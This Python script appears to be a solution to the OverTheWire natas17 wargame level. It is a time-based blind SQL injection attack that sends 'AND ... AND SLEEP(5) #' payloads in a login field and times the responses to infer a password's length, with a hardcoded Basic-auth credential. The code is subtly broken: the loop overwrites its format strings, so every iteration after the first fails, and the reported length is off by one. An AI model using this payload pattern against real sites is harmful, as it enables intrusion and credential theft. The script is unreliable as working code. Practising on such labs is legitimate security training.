#! /usr/bin/python3

import requests
import time

condition = "LENGTH(password) >= %d"
payload = "natas18\" AND %s AND SLEEP(5) #"
headers = {"Authorization": "Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA=="}
url = "http://natas17.natas.labs.overthewire.org/index.php"

for i in range(30):
    condition = condition % i
    payload = payload % condition
    data = {"username": payload}
    start = time.time()
    r = requests.post(url, headers=headers, data=data)
    end = time.time()
    if (end - start > 4):
        print("The length of the password is: " + str(i + 1))
        break
